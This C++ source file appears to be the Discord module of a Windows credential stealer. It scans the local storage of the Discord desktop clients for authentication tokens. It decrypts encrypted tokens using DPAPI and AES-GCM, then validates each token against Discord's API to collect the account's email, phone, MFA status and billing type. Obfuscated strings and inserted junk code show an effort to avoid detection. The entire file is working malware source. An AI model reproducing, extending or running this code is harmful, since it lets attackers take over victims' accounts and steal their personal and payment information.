#include "Discord.h"
#include "../utils/Config.h"
#include "../core/Obfuscation.h"
#include "../utils/Crypto.h"
#include "../utils/DynamicAPI.h"
#include <filesystem>
#include <fstream>
#include <regex>
#include <set>
#include <sstream>
#include <algorithm>
#include <winhttp.h>
#include "../../DebugLog.h"
namespace fs = std::filesystem;
namespace Modules {
    std::string Discord::ParseJson(const std::string& json, const std::string& key) {
        std::string pat = "\"" + key + "\":\\s*\"?([^\"\\},]+)\"?";
        std::regex r(pat);
        std::smatch m;
        if (std::regex_search(json, m, r)) {
            std::string v = m[1].str();
            if (!v.empty() && v.front() == '"') v = v.substr(1);
            if (!v.empty() && v.back() == '"') v.pop_back();
            return v;
        }
        return "";
    }
    static std::string DiscordGet(const std::string& token, const std::wstring& path) {
        if (!DynAPI::WHttpOpen) return "";
        HINTERNET hS = DynAPI::WHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hS) return "";
        DynAPI::WHttpSetTime(hS, 6000, 6000, 6000, 6000);
        HINTERNET hC = DynAPI::WHttpConnect(hS, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hC) { DynAPI::WHttpCloseH(hS); return ""; }
        HINTERNET hR = DynAPI::WHttpOpenReq(hC, L"GET", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
        if (!hR) { DynAPI::WHttpCloseH(hC); DynAPI::WHttpCloseH(hS); return ""; }
        std::wstring auth = L"Authorization: " + std::wstring(token.begin(), token.end());
        DynAPI::WHttpSendReq(hR, auth.c_str(), (DWORD)auth.size(), WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
        DynAPI::WHttpRecvResp(hR, NULL);
        std::string body;
        DWORD avail = 0;
        while (DynAPI::WHttpQueryAvail && DynAPI::WHttpQueryAvail(hR, &avail) && avail > 0) {
            std::vector<char> buf(avail + 1, 0);
            DWORD rd = 0;
            if (DynAPI::WHttpReadData(hR, buf.data(), avail, &rd)) body.append(buf.data(), rd);
        }
        DynAPI::WHttpCloseH(hR); DynAPI::WHttpCloseH(hC); DynAPI::WHttpCloseH(hS);
        return body;
    }
    std::string Discord::DecryptVaultToken(const std::string& b64, const std::string& lsPath) {
        auto blob = Crypto::Base64Decode(b64);
        std::ifstream f(lsPath, std::ios::binary);
        if (!f) return "";
        std::string content((std::istreambuf_iterator<char>(f)), {});
        std::regex reg("\"encrypted_key\":\"([^\"]+)\"");
        std::smatch m;
        if (!std::regex_search(content, m, reg)) return "";
        auto keyBlob = Crypto::Base64Decode(m[1].str());
        if (keyBlob.size() <= 5) return "";
        std::string dkStr = Crypto::DecryptDPAPI(std::vector<BYTE>(keyBlob.begin() + 5, keyBlob.end()));
        std::vector<BYTE> mk(dkStr.begin(), dkStr.end());
        if (blob.size() < 15) return "";
        std::vector<BYTE> iv(blob.begin() + 3, blob.begin() + 15);
        std::vector<BYTE> payload(blob.begin() + 15, blob.end());
        if (payload.size() < 16) return "";
        std::vector<BYTE> ct(payload.begin(), payload.end() - 16);
        std::vector<BYTE> tag(payload.end() - 16, payload.end());
        auto dec = Crypto::DecryptAES_GCM(mk, iv, {}, ct, tag);
        return std::string(dec.begin(), dec.end());
    }
    std::vector<std::string> Discord::ExtractFromPath(const std::string& leveldbPath, const std::string& lsPath) {
        std::vector<std::string> tokens;
        if (!fs::exists(leveldbPath)) return tokens;
        std::regex re_plain(S("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}"));
        std::regex re_vault(S("dQw4w9WgXcQ:([^\"\\\\]+)"));
        try {
            for (auto& entry : fs::directory_iterator(leveldbPath)) {
                auto ext = entry.path().extension().string();
                if (ext != S(".log") && ext != S(".ldb")) continue;
                std::ifstream file(entry.path(), std::ios::binary);
                std::string content((std::istreambuf_iterator<char>(file)), {});
                std::smatch m;
                std::string::const_iterator it = content.cbegin();
                while (std::regex_search(it, content.cend(), m, re_plain)) {
                    tokens.push_back(m[0].str());
                    it = m.suffix().first;
                }
                it = content.cbegin();
                while (std::regex_search(it, content.cend(), m, re_vault)) {
                    std::string dec = DecryptVaultToken(m[1].str(), lsPath);
                    if (!dec.empty()) tokens.push_back(dec);
                    it = m.suffix().first;
                }
            }
        } catch (...) {}
        return tokens;
    }
    DiscordAccount Discord::FetchInfo(const std::string& token, const std::string& source) {
        DiscordAccount acc;
        acc.Token  = token;
        acc.Source = source;
        std::string me = DiscordGet(token, L"/api/v9/users/@me");
        if (me.empty() || me.find("\"id\"") == std::string::npos) {
            acc.Valid = false;
            return acc;
        }
        acc.Valid    = true;
        acc.Username = ParseJson(me, "username") + "#" + ParseJson(me, "discriminator");
        acc.ID       = ParseJson(me, "id");
        acc.Email    = ParseJson(me, "email");
        acc.Phone    = ParseJson(me, "phone");
        acc.MFA      = ParseJson(me, "mfa_enabled");
        int pt = 0;
        try { pt = std::stoi(ParseJson(me, "premium_type")); } catch (...) {}
        acc.Nitro = (pt == 0 ? "None" : pt == 1 ? "Nitro Classic" : pt == 2 ? "Nitro Boost" : "Nitro Basic");
        std::string bill = DiscordGet(token, L"/api/v6/users/@me/billing/payment-sources");
        if (!bill.empty() && bill.find("type") != std::string::npos) {
            acc.Billing = bill.find("\"type\":1") != std::string::npos ? "Card" :
                          bill.find("\"type\":2") != std::string::npos ? "PayPal" : "Other";
        } else {
            acc.Billing = "None";
        }
        std::string av = ParseJson(me, "avatar");
        if (!av.empty() && acc.ID != "None")
            acc.Avatar = "https://cdn.discordapp.com/avatars/" + acc.ID + "/" + av + ".png";
        return acc;
    }
        
    std::vector<DiscordAccount> Discord::Grab() {
        JUNK_CODE_LARGE
        char appdata[MAX_PATH] = {};
        GetEnvironmentVariableA(S("APPDATA").c_str(), appdata, MAX_PATH);
        std::string R = appdata;
        const std::pair<std::string, std::string> discordSources[] = {
            {S("Discord"),      R + S("\\discord")},
            {S("Discord PTB"),  R + S("\\discordptb")},
            {S("Discord Canary"),R + S("\\discordcanary")},
            {"", ""}
        };
        std::set<std::string> seen;
        std::vector<DiscordAccount> accounts;
        for (int i = 0; !discordSources[i].first.empty(); ++i) {
            auto& [name, path] = discordSources[i];
            SLOG("[*] Checking %s at %s...", name.c_str(), path.c_str());
            std::string leveldb  = path + S("\\Local Storage\\leveldb");
            std::string lsFile   = path + S("\\Local State");
            auto toks = ExtractFromPath(leveldb, lsFile);
            if (toks.empty()) {
                SLOG("  [-] No tokens found in %s.", name.c_str());
                continue;
            }
            SLOG("  [+] Found %zu potential tokens. Validating...", toks.size());
            for (auto& t : toks) {
                if (!seen.insert(t).second) continue;
                auto acc = FetchInfo(t, name);
                if (acc.Valid) {
                    SLOG("    [+] Valid token found for user: %s", acc.Username.c_str());
                } else {
                    SLOG("    [-] Invalid token: %s...", t.substr(0, 15).c_str());
                }
                accounts.push_back(acc);
            }
        }
        return accounts;
    }
    std::string Discord::Format(const std::vector<DiscordAccount>& data) {
        if (data.empty()) return S("No Discord tokens found.\n");
        std::stringstream ss;
        int n = 1;
        for (auto& d : data) {
            ss << S("Discord Account #") << n++ << (d.Valid ? S(" [VALID]") : S(" [INVALID]")) << "\n";
            ss << S("  Source      : ") << d.Source   << "\n";
            ss << S("  Token       : ") << d.Token    << "\n";
            if (d.Valid) {
                ss << S("  Username    : ") << d.Username << "\n";
                ss << S("  ID          : ") << d.ID       << "\n";
                ss << S("  Email       : ") << d.Email    << "\n";
                ss << S("  Phone       : ") << d.Phone    << "\n";
                ss << S("  Nitro       : ") << d.Nitro    << "\n";
                ss << S("  MFA         : ") << d.MFA      << "\n";
                ss << S("  Billing     : ") << d.Billing  << "\n";
                ss << S("  Avatar      : ") << d.Avatar   << "\n";
            }
            ss << "\n";
        }
        return ss.str();
    }
}
